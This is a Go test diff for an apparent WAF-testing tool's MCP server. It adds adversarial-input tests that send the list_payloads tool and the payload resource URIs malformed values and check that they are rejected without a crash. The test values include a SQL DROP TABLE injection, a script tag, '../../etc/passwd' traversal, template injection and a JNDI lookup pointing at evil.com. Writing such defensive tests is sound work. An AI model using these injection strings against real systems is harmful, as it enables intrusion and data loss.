@@ -15,6 +15,7 @@ import (
 	"github.com/waftester/waftester/pkg/defaults"
 	"github.com/waftester/waftester/pkg/mcpserver"
 	"github.com/waftester/waftester/pkg/output/events"
+	"github.com/waftester/waftester/pkg/payloadprovider"
 	"github.com/waftester/waftester/pkg/templateresolver"
 )
 
@@ -2447,17 +2448,15 @@ func TestGenerateCICDHasInstructions(t *testing.T) {
 }
 
 func TestCategoryDescriptionsComplete(t *testing.T) {
-	// Verify all listed enum categories return a category_info in list_payloads
+	// Verify all ShortNames() categories return a category_info in list_payloads.
+	// This ensures every category exposed in the MCP schema enum has
+	// corresponding metadata in categoryDescriptions (resolved via lookupCategoryMeta).
 	cs := newTestSession(t)
-	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
+	ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
 	defer cancel()
 
-	expectedCategories := []string{
-		"sqli", "xss", "traversal", "auth", "ssrf", "ssti", "cmdi", "xxe",
-		"nosqli", "graphql", "cors", "crlf", "redirect", "upload", "jwt",
-		"oauth", "prototype", "deserialize",
-	}
-	for _, cat := range expectedCategories {
+	allCategories := payloadprovider.NewCategoryMapper().ShortNames()
+	for _, cat := range allCategories {
 		result, err := cs.CallTool(ctx, &mcp.CallToolParams{
 			Name:      "list_payloads",
 			Arguments: json.RawMessage(fmt.Sprintf(`{"category": %q}`, cat)),
@@ -4179,5 +4178,92 @@ func TestListTasks_DeterministicOrder(t *testing.T) {
 		} else if tc.Text != firstOrder {
 			t.Fatalf("non-deterministic task list on attempt %d", attempt)
 		}
+	}
+}
+
+// ═══════════════════════════════════════════════════════════════════════════
+// Negative / adversarial category tests
+// ═══════════════════════════════════════════════════════════════════════════
+
+func TestListPayloads_AdversarialCategory(t *testing.T) {
+	cs := newTestSession(t)
+
+	adversarial := []struct {
+		name      string
+		category  string
+		wantEmpty bool // false means "may return all payloads" (e.g. empty = no filter)
+	}{
+		{"sql injection", `'; DROP TABLE categories;--`, true},
+		{"xss", `<script>alert(1)</script>`, true},
+		{"path traversal", `../../etc/passwd`, true},
+		{"null byte", "null\x00byte", true},
+		{"very long", strings.Repeat("x", 10000), true},
+		{"template injection", `{{.Exec}}`, true},
+		{"jndi", `${jndi:ldap://evil.com}`, true},
+		{"whitespace", `   `, false}, // whitespace-trimmed to empty = no filter = all payloads
+		{"newlines", "sqli\nssti\rxss", true},
+		{"empty", ``, false}, // empty category = no filter = returns all payloads
+	}
+
+	for _, tt := range adversarial {
+		t.Run(tt.name, func(t *testing.T) {
+			ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
+			defer cancel()
+
+			args, _ := json.Marshal(map[string]string{"category": tt.category})
+			result, err := cs.CallTool(ctx, &mcp.CallToolParams{
+				Name:      "list_payloads",
+				Arguments: json.RawMessage(args),
+			})
+			if err != nil {
+				t.Fatalf("CallTool: %v", err)
+			}
+			// Must not crash. May return IsError or empty results — both are fine.
+			if result.IsError {
+				return // graceful rejection
+			}
+
+			text := extractText(t, result)
+			var summary struct {
+				TotalPayloads int `json:"total_payloads"`
+			}
+			if err := json.Unmarshal([]byte(text), &summary); err != nil {
+				// Non-JSON response is acceptable for adversarial input.
+				return
+			}
+			if summary.TotalPayloads != 0 && tt.wantEmpty {
+				t.Errorf("adversarial category %q matched %d payloads, want 0",
+					tt.category, summary.TotalPayloads)
+			}
+		})
+	}
+}
+
+func TestPayloadsByCategoryResource_AdversarialURIs(t *testing.T) {
+	cs := newTestSession(t)
+	ctx := context.Background()
+
+	adversarial := []struct {
+		name string
+		uri  string
+	}{
+		{"sql injection", "waftester://payloads/'; DROP TABLE--"},
+		{"path traversal", "waftester://payloads/../../etc/passwd"},
+		{"null byte", "waftester://payloads/xss\x00sqli"},
+		{"very long", "waftester://payloads/" + strings.Repeat("a", 10000)},
+		{"empty category", "waftester://payloads/"},
+		{"template", "waftester://payloads/{{.Exec}}"},
+	}
+
+	for _, tt := range adversarial {
+		t.Run(tt.name, func(t *testing.T) {
+			_, err := cs.ReadResource(ctx, &mcp.ReadResourceParams{
+				URI: tt.uri,
+			})
+			// Should return error, not panic.
+			if err == nil {
+				t.Error("expected error for adversarial URI, got nil")
+			}
+		})
 	}
 }
